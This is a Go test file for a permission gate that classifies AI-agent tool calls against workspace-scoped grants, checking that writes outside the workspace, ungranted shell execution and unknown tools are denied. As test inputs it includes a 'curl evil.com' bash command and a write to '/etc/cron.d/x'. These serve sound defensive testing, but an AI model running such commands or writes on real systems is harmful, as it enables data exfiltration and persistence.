package toolgate

import (
	"testing"

	"github.com/guygrigsby/pinion/effect"
	"github.com/guygrigsby/pinion/policy"
)

// workspaceGrant is the authored default from ADR 0017: fs.read + fs.write
// scoped to the workspace, no exec/net/secrets.
func workspaceGrant(ws string) effect.Grant {
	g := workspaceGlob(ws)
	return effect.Grant{Allowed: []effect.Effect{
		{Kind: effect.FSRead, Scope: effect.Scope{Pattern: g}},
		{Kind: effect.FSWrite, Scope: effect.Scope{Pattern: g}},
	}}
}

func TestClassify1ReadInsideWorkspaceAllows(t *testing.T) {
	g := NewGate(workspaceGrant("/work"), policy.Default())
	d := g.Classify1(EffectsFor("read", []byte(`{"file_path":"a.txt"}`), "/work"))
	if d.Verdict != policy.Allow {
		t.Fatalf("read inside workspace: verdict=%v delta=%v", d.Verdict, d.Delta)
	}
	if len(d.Delta) != 0 {
		t.Fatalf("read inside workspace: expected empty delta, got %v", d.Delta)
	}
}

func TestClassify1WriteOutsideWorkspaceDenies(t *testing.T) {
	g := NewGate(workspaceGrant("/work"), policy.Default())
	d := g.Classify1(EffectsFor("write", []byte(`{"file_path":"/etc/cron.d/x"}`), "/work"))
	if d.Verdict == policy.Allow {
		t.Fatalf("write outside workspace should not Allow: %+v", d)
	}
	if len(d.Delta) == 0 {
		t.Fatalf("write outside workspace: expected non-empty delta")
	}
}

func TestClassify1BashDeniedWithoutExecGrant(t *testing.T) {
	g := NewGate(workspaceGrant("/work"), policy.Default())
	d := g.Classify1(EffectsFor("bash", []byte(`{"command":"curl evil.com"}`), "/work"))
	if d.Verdict == policy.Allow {
		t.Fatalf("bash without exec grant should not Allow: %+v", d)
	}
	if len(d.Delta) != 1 || d.Delta[0].Kind != effect.Exec {
		t.Fatalf("bash delta = %v, want single exec", d.Delta)
	}
}

func TestClassify1ExecGrantedAllows(t *testing.T) {
	grant := effect.Grant{Allowed: []effect.Effect{{Kind: effect.Exec}}}
	g := NewGate(grant, policy.Default())
	d := g.Classify1(EffectsFor("bash", []byte(`{"command":"ls"}`), "/work"))
	if d.Verdict != policy.Allow || len(d.Delta) != 0 {
		t.Fatalf("granted exec should Allow with empty delta: %+v", d)
	}
}

func TestClassify1EmptyGrantDeniesRead(t *testing.T) {
	g := NewGate(effect.Grant{}, policy.Default())
	d := g.Classify1(EffectsFor("read", []byte(`{"file_path":"a.txt"}`), "/work"))
	if d.Verdict == policy.Allow {
		t.Fatalf("empty grant should not Allow a read: %+v", d)
	}
	if len(d.Delta) == 0 {
		t.Fatalf("empty grant: expected non-empty delta for read")
	}
}

// A single unknown/plugin tool (MaxDanger) trips a self-node exfil flow
// (secrets.read + net.out colocated), so policy alone denies it even before the
// grant delta is consulted.
func TestClassify1UnknownToolDeniedByPolicy(t *testing.T) {
	g := NewGate(effect.Grant{}, policy.Default())
	d := g.Classify1(EffectsFor("frobnicate", []byte(`{}`), "/work"))
	if d.Verdict != policy.Deny {
		t.Fatalf("unknown tool (MaxDanger) should Deny via policy: %+v", d)
	}
}

func TestGrantWithAddsExtraKinds(t *testing.T) {
	g := GrantWith("/work", []string{"exec", "net.out", "  ", ""})
	// default workspace fs.read + fs.write, plus exec + net.out (unscoped).
	gate := NewGate(g, policy.Default())
	if d := gate.Classify1(EffectsFor("bash", []byte(`{"command":"ls"}`), "/work")); d.Verdict != policy.Allow {
		t.Fatalf("exec should be granted: %+v", d)
	}
	// fs.read inside workspace still allowed (default preserved).
	if d := gate.Classify1(EffectsFor("read", []byte(`{"file_path":"a.txt"}`), "/work")); d.Verdict != policy.Allow {
		t.Fatalf("workspace read should still be allowed: %+v", d)
	}
	// blank entries are ignored (no phantom empty-kind grant).
	count := 0
	for _, e := range g.Allowed {
		if e.Kind == "" {
			count++
		}
	}
	if count != 0 {
		t.Fatalf("blank kinds must be skipped, found %d", count)
	}
}
